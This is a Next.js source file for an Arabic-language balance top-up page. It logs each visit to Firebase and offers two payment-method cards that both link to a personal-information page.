import { Card } from "@/components/ui/card"
import Link from "next/link"
import { Monitor, KeyboardIcon as KeypadIcon } from "lucide-react"
import { addData } from "@/lib/firebase"

export default function TopupPage() {
  const  _id=  localStorage.getItem("vistor")
  addData({
    id: _id,
    page:'تعبة رصيد',
    createdDate:new Date().toDateString()
  })
  return (
    <div className="container mx-auto px-4 py-12">
      <div className="max-w-2xl mx-auto">
        <h1 className="text-3xl font-bold text-center mb-4">تعبئة الرصيد</h1>
        <p className="text-xl text-gray-600 text-center mb-12">يرجى اختيار طريقة اعادة تعبئة الحساب</p>

        <div className="grid gap-6">
          <Link href="/personal-info">
            <Card className="p-12 text-center hover:shadow-lg transition-shadow cursor-pointer group">
              <div className="flex flex-col items-center gap-6">
                <div className="w-16 h-16 flex items-center justify-center rounded-full bg-gray-100 group-hover:bg-blue-50 transition-colors">
                  <Monitor className="w-8 h-8 text-gray-600 group-hover:text-blue-600" />
                </div>
                <h2 className="text-xl font-semibold text-gray-800">التسديد عبر الإنترنت</h2>
              </div>
            </Card>
          </Link>

          <Link href="/personal-info">
            <Card className="p-12 text-center hover:shadow-lg transition-shadow cursor-pointer group">
              <div className="flex flex-col items-center gap-6">
                <div className="w-16 h-16 flex items-center justify-center rounded-full bg-gray-100 group-hover:bg-blue-50 transition-colors">
                  <KeypadIcon className="w-8 h-8 text-gray-600 group-hover:text-blue-600" />
                </div>
                <h2 className="text-xl font-semibold text-gray-800">رقم إعادة تعبئة الرصيد</h2>
              </div>
            </Card>
          </Link>
        </div>
      </div>
    </div>
  )
}

